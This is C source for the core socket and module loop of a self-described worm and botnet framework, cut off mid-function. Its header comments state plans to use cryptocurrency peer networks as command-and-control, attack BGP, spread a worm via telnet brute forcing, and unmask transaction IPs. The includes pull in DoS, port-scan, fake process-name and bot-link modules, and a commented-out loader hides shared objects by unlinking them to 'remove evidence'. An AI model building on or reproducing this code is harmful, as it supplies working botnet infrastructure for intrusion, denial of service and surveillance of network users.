/*

the majority of this system is event driver based around sockets, and timers
for keeping things cozy with p2p protocols, etc..

its fairly simple to add new protocols, etc.. you can look at some of the
modules already developed and add another quickly

-----

in a later release + the version that goes live this weekend ill encapsulate some documents which explains why im writing scripting

ill also attach a BGP attack which can cripple the internet.. i hope it works :) ill leave source for everything

this started as a universal crypto currency library.. now its just a building block for making
quick networking/automated apps

I'll use it for crypto currencies, worm, etc
----

minimalist crypto currency library possible

This will be the smallest, simplest crypto currency library available.  The goal is to monitor all
currencies with one single app.  This will not be a wallet..

The entire point is to become part of the network, and just pass messages received to other Connection.
It can be a basis for using crypto currency as C&C, or to monitor the networks transactions, etc.. It will perform
0 cryptographic verification, and purely is to become part of a message passing network.

It might require you to use legitimate transfers in some cases, although if you connect to enough nodes you may be able to
skip using a legit one and enter the functions directly.

I'll keep a single port open that will allow dumping transactions into any crypto currency...
so it can really be used as a gateway for C&C etc..
*/

/*
socket -> read -> incoming queue -> incoming parse -> internal state

incoming parse / logic -> outgoing msg generator -> outgoing queue -> socket

we'll have basic socket i/o , and structures to add currencies in a modular way
it'll do its best to stay connected, and use currency specific functions for finding new nodes
maybe add a scripting language later...

future: zeromq to other mcclp nodes, and analysis to determine most important nodes for attack

analysis: with enough nodes connecting around.. we can easily determine IPs of transactions by connecting to every node
so often and ensuring we are never further than 1 hop from any node.. also being connected to at least X nodes
from each long standing would help as well

litecoin,
dogecoin,etc
dash,
namecoin,   
eth,nxt,
peercoin,
storj


ALSO:
DHT,
tftpd for worm
HTTPD for worm
irc (scanning w seed algorithm+c&c)

-- might skip this due to 250kb added to the binary --
todo: add lua w bindings for integrating networking, etc
allows ew modules in easy fashion + quicker replicating and updating remotely

ill add a way to encapsulate messages to other nodes inside of crypto currencies...
just another way to harm them

and ability to generate irc servers for worms.. and link them together via crypto currency links
so nodes can use several communication methods, and irc can be used to control

--

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <Python.h>
#include "structs.h"
#include "list.h"
#include "utils.h"

// crypto currencies:
// bitcoin = main/parent
#include "modules/bitcoin/note_bitcoin.h"
// child of bitcoin - shares same functions
#include "modules/bitcoin/alt/litecoin/note_litecoin.h"
// child of bitcoin - shares same functions
#include "modules/bitcoin/alt/namecoin/note_namecoin.h"
// child of bitcoin - shares same functions
#include "modules/bitcoin/alt/peercoin/note_peercoin.h"
// telnet module
#include "modules/telnet/telnet.h"
// port scanning.. (supplies telnet w connections, etc)
#include "modules/portscan/portscan.h"
// DoS/DDoS module
#include "modules/dos/attacks.h"
// http web servers
#include "modules/httpd/httpd.h"
// fake 'ps' name
#include "modules/fakename/fakename.h"
// bot communication
#include "modules/botlink/botlink.h"
// data module
#include "modules/data/data.h"
// management
#include "modules/management/management.h"
// find bots / resilency
#include "modules/findbots/findbots.h"

#define MAX(a, b) ((a) > (b) ? ( a) : (b))
#define MIN(a, b) ((a) < (b) ? ( a) : (b))

Modules *module_list = NULL;
SpyFuncs *spy_list = NULL;

// our IP passed from telnet module during brute force/worm
char my_ip[16] = "\0";


// prepare fd set / fd & max fds for select()
void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int fd, int *max_fd) {
    // set the fd inside of fd_set
    if (fdset != NULL)
        FD_SET(fd, fdset);
    if (fdset2 != NULL)
        FD_SET(fd, fdset2);
    if (fdset3 != NULL)
        FD_SET(fd, fdset3);
    
    *max_fd = MAX(fd + 1, *max_fd);
}

SpyFuncs *SpyGet(Modules *mptr) {
    SpyFuncs *sptr = spy_list;
    while (sptr != NULL) {
        if (sptr->module == mptr) break;
        
        sptr = sptr->next;
    }
    
    return sptr;
}

// have to read man pages.. im coding under WSL with windows 10 (linux to windows conversion) therefore
// i have to double cehck later but gonna use this hack until i get a VM up, or read man pages again
int is_sock_connected(int fd) {
    int err = 0;
    socklen_t size = sizeof (err);
    int retval = getsockopt (fd, SOL_SOCKET, SO_ERROR, &err, &size);

    if (retval != 0) return 0;
    if (err != 0) return 0;

    return 1;
}


void OutgoingFlush(Connection *cptr) {
    Queue *qptr = NULL;
    int cur_time = time(0);
    SpyFuncs *sptr = SpyGet(cptr->module);
    struct in_addr dst;
    int connected = is_sock_connected(cptr->fd);

    dst.s_addr = cptr->ip;
    if (connected == 1 && cptr->state == TCP_NEW) {
    printf("is sock connected? fd %d %d  ip %s [mptr %p] closed %d cptr %p NEW? %d\n", cptr->fd, connected, inet_ntoa(dst), cptr->module, cptr->closed, cptr,
    cptr->state == TCP_NEW);
    }

    if ((is_sock_connected == 0) && cptr->state == TCP_NEW) {
        //printf("NEW is sock connected? fd %d %d  ip %s [mptr %p] closed %d cptr %p\n", cptr->fd, connected, inet_ntoa(dst), cptr->module, cptr->closed, cptr);
        ConnectionBad(cptr);
        return;
    }

    // is this a new connection?
    if (cptr->state == TCP_NEW) {
        cptr->state = TCP_CONNECTED;

        if (sptr != NULL && sptr->funcs.connect != NULL)
            sptr->funcs.connect(cptr->module, cptr, NULL, 0);
        
        if (cptr->module->functions->connect != NULL) {
            
            if (cptr->module->functions->connect(cptr->module, cptr, NULL, 0) == 1)
                return;
        }
    }
    
    // can write now.. check outgoing queue
    // do we have an outgoing queue to deal with?
    if ((qptr = cptr->outgoing) != NULL) {  
        while (qptr != NULL) {
            // outgoing might not write everything first shot..
            int wrote = write(cptr->fd, qptr->buf, qptr->size);
            
            // if errors..
            if (wrote <= 0) {
                ConnectionBad(cptr);
                return;
            }

            printf("outgoing flush wrote %d\n", wrote);
            
            // we wrote less than the outgoing buffer
            if (wrote < qptr->size) {
                // move the buffer to beginning.. so we dont have to reallocate in a new location
                memmove(cptr->buf, cptr->buf+wrote, qptr->size-wrote);
                // fix sizes                
                qptr->size -= wrote;
                // we break here because we cant process msg #2 without fully
                // transmitting message #1
                break;
            } else {
                // remove this current queue. and proceed to the next (if it exists)
                L_del_next((LIST **)&cptr->outgoing, (LIST *)qptr, (LIST **)&qptr);
            }
        }
    } else {
        
        // if its supposed to close after.. lets close it..after timeout
        // 20 seconds is for small files.. we should change this to variation (at least X kb/second) ****
        if (cptr->state == TCP_CLOSE_AFTER_FLUSH) {
            if (cptr->ping_ts == 0) {
                cptr->ping_ts = cur_time;
            }
            // give it 20 seconds after flushing
            if ((cur_time - cptr->ping_ts) > 20) {
                ConnectionBad(cptr);
            }
                
        }
    }
}

/*
move a connection from one module to another.. 
creating for port scanning to a module so the fd is passed and doesnt require two connections
*/
Connection *ConnectionAdopt(Modules *original, Modules *newhome, Connection *conn) {
    Connection *cptr = NULL;
    int fd = 0;
    
    if ((cptr = (Connection *)L_add((LIST **)&newhome->connections, sizeof(Connection))) == NULL)
        return NULL;
    
    cptr->addr = cptr->ip = conn->addr;
    cptr->port = conn->port;
    cptr->state = conn->state;
    cptr->fd = conn->fd;
    // move queues over.. 
    cptr->outgoing = conn->outgoing;
    cptr->incoming = conn->incoming;
    conn->outgoing = NULL;
    conn->incoming = NULL;
    cptr->list = &newhome->connections;
    cptr->module = newhome;
    
    // remove from original
    // set to 0 so it doesnt close the connection
    conn->fd = 0;

    // bug was here i think? where it wasnt removing .. lets see
    //cptr->module = NULL;
    
    // mark as bad to get removed from other functions..
    // when L_del() here created a bug in the loop near select()
    ConnectionBad(conn);
    //L_del((LIST **)&original->connections, (LIST *)conn);
        
    return cptr;
}

/*
called when a connection has an error, or ends..
the module can choose to keep it alive (by reconnecting, etc)
*/
void ConnectionBad(Connection *cptr) {
    int r = 0;
    SpyFuncs *sptr = SpyGet(cptr->module);
    
    //printf("cptr bad %d\n", cptr->fd);

    if (sptr != NULL && sptr->funcs.outgoing != NULL)
        sptr->funcs.outgoing(cptr->module, cptr, NULL, 0);
    
    // free buffers..
    QueueFree(&cptr->incoming);
    QueueFree(&cptr->outgoing);
    
    if (cptr->module && cptr->module->functions->disconnect != NULL) {
        if (sptr != NULL && sptr->funcs.disconnect != NULL)
            sptr->funcs.disconnect(cptr->module, cptr, NULL, 0);
            
        r = cptr->module->functions->disconnect(cptr->module, cptr, NULL, 0);
        // 1 from disconnect means we are reusing...
        if (r == 1) {
            //printf("we wanna reuse a connection fd %d\n", cptr->fd);
            return;
        }
    }

    // close socket
    if (cptr->fd > 0) {
        close(cptr->fd);
        cptr->fd = 0;
    }
        
    // mark for deletion    
    cptr->closed = 1;

    return;
}

void ConnectionCleanup(Connection **conn_list) {
    Connection *cptr = NULL;
    int count = 0;

    for (cptr = *conn_list; cptr != NULL; ) {
        if (cptr->closed) {
            // remove the connection.. and get the next element from it
            L_del_next((LIST **)conn_list, (LIST *)cptr, (LIST **)&cptr);
            continue;            
        }
        
        // if we didnt remove it.. the next is simple to iterate
        cptr = cptr->next;
    }

}


// select & handle i/o of sockets
void socket_loop(Modules *modules) {
    Modules *mptr = NULL;
    Connection *cptr = NULL;
    Queue *qptr = NULL;
    Queue *qnext = NULL;
    Connection *modcptr = NULL;
    int maxfd = 0;
    struct timeval ts;
    int count = 0;
    struct in_addr dst;
    
    // wait 100 ms for select
    ts.tv_sec = 0;
    ts.tv_usec = 500;

    fd_set readfds;
    fd_set writefds;
    fd_set errorfds;
    
    FD_ZERO(&readfds);
    FD_ZERO(&writefds);
    FD_ZERO(&errorfds);
    
    // setup all possible module file descriptors for select
    for (mptr = modules; mptr != NULL; mptr = mptr->next) {
        
        // the module may have several Connection as well
        for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
            if ((modcptr->fd == 0) || modcptr->closed)
                continue;
                
            setup_fd(modcptr->state == TCP_NEW ? NULL : &readfds, &writefds, &errorfds, modcptr->fd, &maxfd);
            
            count++;    
        }
    }
    
    if (!count) {
        usleep(500);
        
        return;
    }

    if (select(maxfd, &readfds, &writefds, &errorfds, &ts) > 0) {
        // loop to check module file descriptors first
        for (mptr = modules; mptr != NULL; mptr = mptr->next) {
            ConnectionCleanup(&mptr->connections);
            // the module may have several Connection as well
            for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
                /*if (modcptr->module == NULL) {
                    printf("connection has noo module but listed! fd %d\n", modcptr->fd);
                }*/
                
                if (FD_ISSET(modcptr->fd, &readfds)) {
                    if (modcptr->state == TCP_NEW) {
                        printf("have a new being read\n");
                        // this was in outgoing flush.. i thought write fds would work properly.. weird
                        // lets try on read fds.. i can move code later for connections being detected...
                        OutgoingFlush(modcptr);
                        continue;
                    }

                    if (modcptr->state == TCP_LISTEN) {
                        // if its listening... its a new connection..
                        // it needs to adopt to its correct module after
                        // accepting
                        ConnectionNew(modcptr);
                    } else {
                        ConnectionRead(modcptr);
                    }
                }

                if (FD_ISSET(modcptr->fd, &errorfds)) {
                    ConnectionBad(modcptr);
                    continue;
                }

                if (FD_ISSET(modcptr->fd,&writefds)) {
                    dst.s_addr = modcptr->ip;
                    //printf("write fd on connection fd %d ip %s\n", modcptr->fd, inet_ntoa(dst));
                    if (modcptr->state == TCP_NEW) {
                        //printf("writefd have a new with write being possible mptr %p fd %d closed %d\n", mptr, modcptr->fd, modcptr->closed);
                    }
                    OutgoingFlush(modcptr);
                    continue;
                }

            }
        }
    }
}

Connection *ConnectionFind(Connection *list, uint32_t addr) {
    Connection *cptr = list;
    
    while (cptr != NULL) {
        if (cptr->addr == addr)
            break;
        
        cptr = cptr->next;
    }
    
    return cptr;
}

// data is absolutely waiting here..
void ConnectionRead(Connection *cptr) {
    int waiting = 0;
    char *buf = NULL;
    int size = 0;
    int r = 0;
    Queue *newqueue = NULL;
    
    //printf("connectionread: fd %d\n", cptr->fd);
    // check size waiting
    // maybe find another way.. not sure if ioctl will work everywhere
    ioctl(cptr->fd, FIONREAD, &waiting);    

    // if nothing is waiting.. but we were sent here.. connection must be clossed.
    if (!waiting) {
        ConnectionBad(cptr);
        return;
    }


    // lets add a little more just in case a fragment came in
    size = waiting;
    if ((buf = (char *)malloc(size + 1)) == NULL) {
        // handle error..
        ConnectionBad(cptr);
        return;
    }
    
    // verify we read something.. if not its bad
    if (( r  = read(cptr->fd, buf, size)) <= 0) {
        ConnectionBad(cptr);
        return;
    
    }
    
    if ((newqueue = (Queue *)L_add_ordered((LIST **)&cptr->incoming, sizeof(Queue))) == NULL) {
        // error!
        ConnectionBad(cptr);
    }
    
    // all is well..
    newqueue->buf = buf;
    newqueue->size = r;
}


// handle basic TCP/IP (input/output)
void network_main_loop(Modules *mptr) {
    Queue *qptr = NULL;
    Connection *cptr = NULL;
    SpyFuncs *sptr = SpyGet(mptr);
        
    // loop for each connection under this module..
    for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
        // do we have an incoming queue to deal with?
        if (cptr->incoming != NULL) {
            
            // lets attempt to merge messages that may be fragmented in the queue
            QueueMerge(&cptr->incoming);  
            
            for (qptr = cptr->incoming; qptr != NULL; ) {
                // first we hit our read function..maybe compressed, or encrypted
                
                qptr->chopped = 0;
                
                if (sptr != NULL && sptr->funcs.read_ptr != NULL)
                    sptr->funcs.read_ptr(mptr, cptr, &qptr->buf, &qptr->size);
                    
                if (mptr->functions->read_ptr != NULL)
                    mptr->functions->read_ptr(mptr, cptr, &qptr->buf, &qptr->size);
                
                // parse data w specific note's parser
                if (mptr->functions->incoming != NULL) {
                    if (sptr != NULL && sptr->funcs.incoming != NULL)
                        sptr->funcs.incoming(mptr, cptr, qptr->buf, qptr->size);
                        
                    if (mptr->functions->incoming(mptr, cptr, qptr->buf, qptr->size) < 1) {
                        // we break since nothing we're looking for is there.. 
                        break;
                    }
                }
                
                // if its been chopped..we need to break so next loop processes it as a command 
                if (qptr->chopped)
                    break;
                
                L_del_next((LIST **)&cptr->incoming, (LIST *)qptr, (LIST **)&qptr);                
            }
        }
        // outgoing gets handled in tcp_socket_loop() (yes i know it happens on the next loop)
    }
}

// Queus data outgoing to the other p2p conenctins just as it is given..
// returns how many times its been queued
// relay = if its coming from another node for p2p..
// 0 means absolutely hit the specific connection
int QueueAdd(Modules *module, Connection *conn, Queue **queue, char *buf, int size) {
    int ret = 0;
    char *start_buf = buf;
    Connection *cptr = NULL;
    Queue *newqueue = NULL;
    char *newbuf = NULL;
    SpyFuncs *sptr = SpyGet(module);
    
    if (sptr != NULL && sptr->funcs.outgoing != NULL)
        sptr->funcs.outgoing(module, conn, &buf, &size);
    
    // does application layer processing (maybe filtering, modification)
    if (!module->functions->outgoing || module->functions->outgoing(module, conn, &buf, &size)) {
        // now we have to call the ->write function to encrypt, or compress
        // needs pointers to buf/size to replace it if need be..
        if (!module->functions->write_ptr || module->functions->write_ptr(module, conn, &buf, &size)) {
            // create a new buffer since calling function will free
            if ((newbuf = (char *)malloc(size + 1)) == NULL)
                return -1;
            
            memcpy(newbuf, buf, size);

            // where to add queue.. if we specify use it, otherwise outgoing         
            if ((newqueue = (Queue *)L_add_ordered((LIST **)(queue ? queue : &conn->outgoing), sizeof(Queue))) == NULL)
                return -1;
        
            newqueue->buf = newbuf;   
            newqueue->size = size;
            
            ret = 1;
        }
    }

    // free buf if it was modified during outgoing/write
    if (start_buf != buf) free(buf);
    
    return ret;
    
}

// adds a p2p message for distribution to all nodes on a particular module
// needs to verify state is OK.. need an OK state across all modules
int RelayAdd(Modules *module, Connection *conn, char *buf, int size) {
    int ret = 0;
    Connection *cptr = NULL;
    SpyFuncs *sptr = SpyGet(module);

    if (sptr != NULL && sptr->funcs.outgoing != NULL)
        sptr->funcs.outgoing(module, conn, &buf, &size);
            
    // does application layer processing (maybe filtering, modification)
    if (!module->functions->outgoing || module->functions->outgoing(module, conn, &buf, &size)) {
        // now we have to call the ->write function to encrypt, or compress
        // needs pointers to buf/size to replace it if need be..
        if (!module->functions->write_ptr || module->functions->write_ptr(module, conn, &buf, &size)) {
            // loop for each connection in this note
            for (cptr = module->connections; cptr != NULL; cptr = cptr->next) {
                if (!stateOK(cptr)) continue;
                
                // if we are not relaying and its not our connection.. move on
                // if we ARE relaying and it is the same connection.. skip
                // *** rewrite this.. maybe separate into two functions
                if (cptr == conn)
                    continue;
                
                // so we return how many times we have queued it successfully
                ret += QueueAdd(module, cptr, NULL, buf, size);
            }
        }
    }
    
    return ret;
}    


// chop X data off the front of a queue (used after a command in botlink is read)
// since removing the queue completely is bad
int QueueChop(Queue *qptr, int size) {
    if (size >= qptr->size) {
        return 0;
    }
    
    memmove(qptr->buf, qptr->buf + size, qptr->size - size);
    qptr->size -= size;
    
    qptr->chopped = 1;
    
    return 1;
}

Queue *QueueFindBuf(Queue *qlist, char *buf) {
    Queue *qptr = qlist;
    
    while (qptr != NULL) {
        if (qptr->buf == buf)
            break;
        
        qptr = qptr->next;
    }
    
    return qptr;
}

// chop X data off the front of a queue (used after a command in botlink is read)
// since removing the queue completely is bad
int QueueChopBuf(Connection *cptr, char *buf, int size) {
    Queue *qptr = NULL;
    
    // find the buffer in a connection matching a queue
    qptr = QueueFindBuf(cptr->incoming, buf);
    if (qptr == NULL)
        qptr = QueueFindBuf(cptr->outgoing, buf);

    if (qptr == NULL)
        return -1;
    
    return QueueChop(qptr, size);
}


// Takes several incoming messages queued and merges them together
// Just in case our parsing function didnt have enough data, etc..
// fixes packet fragmentation.. and it could be faster by merging several simultaneously
// however it'd be a bit more logic and I don't care to do it now
int QueueMerge(Queue **queue) {
    int count = 0;
    Queue *qptr = *queue;
    Queue *qptr2 = NULL;
    char *buf = NULL;
    int size = 0;
    char *ptr = NULL;
    int i = 0;
    
    // no need to merge anything if theres only a single queues    
    if ((count = L_count((LIST *)qptr)) < 2) {
        return 0;
    }
    
    // i'll start by merging only 1 at a time.. the msg just wont process if its too short..
    // another loop and it should be fine
    // speed is irrelevant for this operation
    if (count >= 2) {
        // get the next buffer waiting..
        qptr2 = qptr->next;
        // calculate size of both
        size = qptr->size + qptr2->size;
        
        if ((buf = (char *)calloc(1, size + 1)) == NULL) {
            return -1;
        }
        
        // copy buffer to new memory location        
        memcpy(buf, qptr->buf, qptr->size);
        // copy second buffer behind it
        memcpy(buf + qptr->size, qptr2->buf, qptr2->size);
        
        // remove original buffer and replace..
        qptr->size = size;
        // free first buffer (since we are going to overwrite the pointer with the new)
        free(qptr->buf);
        // replace buffer pointer to new
        qptr->buf = buf;
        
        //print_hex(qptr->buf, qptr->size);
        // remove qptr2 from list.. itll free the buf in l_del()
        L_del((LIST **)queue, (LIST *)qptr2);
    }
}

void QueueFree(Queue **qlist) {
    Queue *qptr = *qlist;
    
    while (qptr != NULL) {
        L_del_next((LIST **)qlist, (LIST *)qptr, (LIST **)&qptr);
    }
}

bool ASCII_is_endline(unsigned char c) {
    char ASCII_characters[] = "\r\n";
    return (ASCII_characters[0] == c || ASCII_characters[1] == c);
}

char *ASCIIcopy(char *src, int size) {
    char *ret = NULL;
    
    if ((ret = (char *)malloc(size + 2)) != NULL) {
        memcpy(ret, src, size);
        // ensure it ends with a NULL byte
        ret[size] = 0;
    }
    
    return ret;
}

// lets parse a queue by ASCII (\r\n) for web, irc, shell, etc..
// itll keep the rest of the buffer in the queue for next loop
char *QueueParseAscii(Queue *qptr, int *size) {
    char *ret = NULL;
    int i = 0;
    char *sptr = NULL;
    int n = 0;
    char *newbuf = NULL;
    
    while (i < qptr->size) {
        if (ASCII_is_endline((unsigned char)qptr->buf[i])) {
            // lets queue...

            n = i + 2;
            // find start of next line (after end lines finished.. just in case its \r\n)
            while (i < qptr->size && i < n && ASCII_is_endline((unsigned char)qptr->buf[i]))
                i++;
            
            ret = ASCIIcopy(qptr->buf, i);
            *size = i;
            

            if (i < qptr->size) {
                n = qptr->size - i + 1;
                newbuf = (char *)calloc(1, n+1);
                if (newbuf == NULL) {
                    //printf("couldnt alloc %d - %d\n", n, errno);
                    return NULL;
                }
                memcpy(newbuf, qptr->buf + i, qptr->size - i);
                
                qptr->buf = newbuf;
                qptr->size -= i;
            }
            
            qptr->chopped = 1;
            
            break;
        }
        
        i++;
    }

    // return pointer
    return ret;
}

int ExternalExecutePython(Modules *eptr, char *script, char *func_name, PyObject *pVars);

// main loop of the application.. iterate and execute each module
// ive made it easy to pass a list argument so modules themselves can
// execute other modules.. so hack/worm can have portscan/telnet/ssh brute forcing etc
int Modules_Execute(Modules *_module_list, int *sleep_time) {
    unsigned int ts = time(0);
    Modules *mptr = NULL;
    int active_count = 0;
    ExternalModules *eptr = NULL;
    
    // first handle all socket I/O...
    socket_loop(_module_list);

    for (mptr = _module_list; mptr != NULL; mptr = mptr->next) {
        // first handle tcp/ip I/O
        if (L_count((LIST *)mptr->connections)) {
            network_main_loop(mptr);
            active_count++;
        }
        
        // now run plumbing for every interval
        if (ts - mptr->timer_ts > mptr->timer_interval) {
            mptr->timer_ts = ts;
            
            if (mptr->functions->plumbing)
                mptr->functions->plumbing(mptr, NULL, NULL, 0);
                    
        }
        
        // cleanup stale Connection
        ConnectionCleanup(&mptr->connections);        

    }
    
    // lets calculate how much time to sleep.. if we have connections
    // then we wanna execute faster..    
    //*sleep_time = c - MIN((active_count * 250000), 750000);
    *sleep_time = 1000;//active_count ? 15000 : 1000000; 
}

// Adds a module to a list
int Module_Add(Modules **_module_list, Modules *newmodule) {
    newmodule->next = *_module_list;
    *_module_list = newmodule;
    
    newmodule->start_ts = time(0);
}


// listen on a tcp port
Connection *tcp_listen(Modules *mptr, int port) {
    int fd = 0;
    Connection *ret = NULL;
    int r = 0;
    int sock_opt = 0;
        
    struct sockaddr_in dst;
    dst.sin_addr.s_addr = inet_addr("0.0.0.0");
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    
    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        // ret = NULL..
        return ret;
    }
    
    // set non blocking I/O for socket..
    sock_opt = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK | SO_REUSEPORT);
    
    if (bind(fd, (struct sockaddr *)&dst, sizeof(struct sockaddr_in)) == -1) {
        close(fd);
        return NULL;
    }
    
    // max of 5 backlog..? should be fine..
    listen(fd, 100);
    
    ret = (Connection *)L_add((LIST **)&mptr->connections, sizeof(Connection));
    if (ret == NULL) {
        close(fd);
        return ret;
    }
    
    ret->fd = fd;
    ret->port = port;
    
    ret->module = mptr;
    ret->list = &mptr->connections;
    ret->addr = dst.sin_addr.s_addr;
    ret->state = TCP_LISTEN;
    
    printf("listen fd %d port %d\n", fd, port);
    
    return ret;
}


// custom variables for a python module
typedef struct _python_module_custom {
    // so we can verify its the correct structure..
    int size;
#ifdef PYTHON_MODULES
    // if python... this allows to easily kill the script
    PyThreadState *python_thread;
    PyObject *pModule;
#endif
} PythonModuleCustom;


// not sure if this is necessary.. it could be downright bad..
// connections already have this inside of some modules..
void *CustomPtr(Connection *cptr, int custom_size) {
    if (cptr->buf == NULL) {
        if ((cptr->buf = (char *)calloc(1, custom_size + 1)) == NULL)
            return NULL;        
    }

    return (void *)cptr->buf;
}


// finds a connection by its destination address
Connection *ConnectionByDST(Modules *mptr, uint32_t dst) {
    Connection *cptr = mptr->connections;
    
    while (cptr != NULL) {
        if (cptr->addr == dst)
            break;
            
        cptr = cptr->next;
    }
    return cptr;
}

// socket connection outgoing for p2p framework
// -1 = error allocating, 0 = cannot connect
// 1 = non blocking processing or connected
Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, int port, Connection **_conn) {
    Connection *ret = NULL;
    int fd = 0;
    int r = 0;
    Connection *cptr = NULL;
    int sock_opt = 0;
    
    // let operating system know what type of socket/connection/parameters in this structure
    struct sockaddr_in dst;
    dst.sin_addr.s_addr = ip;//inet_addr(strIP);
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
        
        
    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
        return ret;

    // set non blocking I/O for socket..
    sock_opt = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK);

    //printf("tcp connect - %s %d\n", inet_ntoa(dst.sin_addr), port);

    // lets do this before allocating the connection structure..
    r = connect(fd, (struct sockaddr *)&dst, sizeof(struct sockaddr_in));
    
    if (r == -1 && errno != 115) {
        //printf("r %d errno = %d\n",r, errno);
        close(fd);
        
        return NULL;
    }

    
    // if we are reusing a structure.. do it otherwise create a new
    if (_conn == NULL || *_conn == NULL)
        cptr = (Connection *)L_add((LIST **)&mptr->connections, sizeof(Connection));
    else
        cptr = *_conn;
        
    if (cptr != NULL) {
        // quick freeing later..
        cptr->list = &mptr->connections;
        
        // open a specific socket type for tcp/ip outgoing
        cptr->fd = fd;
        cptr->port = port;
        cptr->ip = ip;
        cptr->state = TCP_NEW;
        cptr->addr = ip;
        cptr->module = mptr;
        cptr->start_ts = time(0);

        if (_conn != NULL)        
            *_conn = cptr;
        
        ret = cptr;
    }
    
    // !*_conn = only delete if its brand new.. not a prior reconnecting
    // because itll be inside of events, etc.. and itll reuse the memory..
    // like this itll get removed during Cleanup()
    if (ret == NULL && cptr && !*_conn) {
        L_del((LIST **)&mptr->connections, (LIST *)cptr);
    }
    
    return ret;
}

// accepts new connections from a listen socket
void ConnectionNew(Connection *cptr) {
    Connection *conn = NULL;
    int sockfd = 0;
    struct sockaddr_in src;
    socklen_t socklen = sizeof(struct sockaddr_in);
    
    // if we cannot accept it for some reason...
    if ((sockfd = accept(cptr->fd,(struct sockaddr *) &src, &socklen)) <= 0) {
        return;
    }
    
    // create a new connection structure to hold it under the appropriate module
    conn = (Connection *)L_add((LIST **)cptr->module->connections, sizeof(Connection));
    if (conn == NULL) {
        close(sockfd);
        return;
    }
    
    // setup appropriate configuration for the new connection
    conn->fd = sockfd;
    conn->ip = src.sin_addr.s_addr;
    conn->port = src.sin_port;
    conn->module = cptr->module;
    conn->list = cptr->list;
    conn->state = TCP_CONNECTED;

    return;        
}



Node *node_find(Modules *note, uint32_t addr) {
    Node *nptr = note->node_list;
    
    while (nptr != NULL) {
        if (nptr->addr == addr) break;
        nptr = nptr->next;
    }
    
    return nptr;
}

Node *node_add(Modules *note, uint32_t addr) {
    Node *nptr = NULL;
    
    // attempt to find node first..
    if ((nptr = node_find(note, addr)) != NULL) return nptr;
    
    // create the node
    if ((nptr = (Node *)L_add((LIST **)&note->node_list, sizeof(Node))) == NULL)
        return NULL;
        
    // set node parameters
    nptr->addr = addr;
    nptr->first_ts = (uint32_t)time(0);
    nptr->last_ts = nptr->first_ts;
    
    return nptr;
}

// add a set of 'spy' functions to monitor a modules messages
int SpyAdd(Modules *mptr, ModuleFuncs *funcs) {
    SpyFuncs *sptr = NULL;
    
    sptr = (SpyFuncs *)L_add((LIST **)&spy_list, sizeof(SpyFuncs));
    if (sptr == NULL)
        return -1;

    sptr->module = mptr;
    
    // copy our spy functions over.. itll get called before actual funcs
    memcpy((void *)&sptr->funcs, funcs, sizeof(ModuleFuncs));
    
    return 1;
}

// if we have any reasons to initialize anything here..
// could be encryption keys, our IP address, etc..
// i wont deal with encryption here for now.. botlink will do it on demand
int various_init() {
    struct sockaddr_in me;
    // find IP and put into 'my_ip'
    uint32_t src = getOurIPv4();
    me.sin_addr.s_addr = src;
    strcpy(my_ip, inet_ntoa(me.sin_addr));
}


int python_module_deinit(Modules *mptr) {
#ifdef PYTHON_MODULES
    PythonModuleCustom *evars = (PythonModuleCustom *)ModuleCustomPtr(mptr, sizeof(PythonModuleCustom));
    
    if (evars == NULL) return -1;
    
    if (evars->python_thread)
        Py_EndInterpreter(evars->python_thread);
#endif        
    return 0;
}


// deinitialize an external module
int ModuleDeinit(Modules *eptr) {
    int ret = 0;
    
    if (eptr->outfd == 0) return 0;
    
    ret = python_module_deinit(eptr);
    /*
    if (ret == 1) {
        if (eptr->type == MODULE_TYPE_SO) {
            // close dl handle
            if (eptr->dl_handle)
                dlclose(eptr->dl_handle);   
        }
        
        // close file descriptor
        close(eptr->outfd);
        // null out plumbing so we know its not initialized
        eptr->outfd = 0;
    }
*/
    if (eptr->outfd == 0) return 0;
        
    return 1;    
}


// initialize an external module
// need to write to a file..
// we will open a temp file, and then delete it
// then we can open it by the file descriptor using dlopen
// after that we can dlsym from that handle and everything will be fine
int ModuleInit(Modules *eptr) {
  int write_fd = 0;
  int i = 0;
  int ret = -1;
  char *tmpname = NULL;
  FILE *ofd = NULL;
  void *dl_handle = NULL;
  char filename[64];
  
  void *_init = NULL;
  void *_deinit = NULL;
  void *_plumbing = NULL;
  PythonModuleCustom *evars = NULL;
  
  if (eptr->type == MODULE_TYPE_PYTHON) {
      // first we must deinit it..
      if (ModuleDeinit(eptr) == 0)
        return ret;
  }
  
  /*
  // now we can init it..
  if ((tmpname = tempnam("/tmp", ".so")) == NULL)
    return ret;
  
  if ((ofd = fopen(tmpname, "wb")) == NULL)
    return ret;
  // unlink the temporary file from the filesystem..
  // trick and then you open it by the file descriptor using /proc  
  unlink(tmpname);
  
  // retrieves the file descriptor # from the FILE structure
  eptr->outfd = fileno(ofd);
  
  // generate a filename directly to the file descriptor..
  // since we just unlinked it from the filesystem to remove evidence
  sprintf(filename, "/proc/%d/fd/%d", getpid(), eptr->outfd);
  
  
  // now write the buffer..
  i = fwrite(eptr->buf, eptr->size, 1, ofd);
  if (i == eptr->size) {
      if (eptr->type == MODULE_TYPE_SO) {
        dl_handle = (void *)dlopen(filename, RTLD_GLOBAL);
        
        if (dl_handle != NULL) {
            // get function handles from dlsym()
            _init = (void *)dlsym(dl_handle, "init");
            _deinit = (void *)dlsym(dl_handle, "deinit");
            _plumbing = (void *)dlsym(dl_handle, "plumbing");

            // prepare the module structure         
            eptr->init = (external_func)_init;
            eptr->deinit = (external_func)_deinit;
            eptr->plumbing = (module_func)_plumbing;
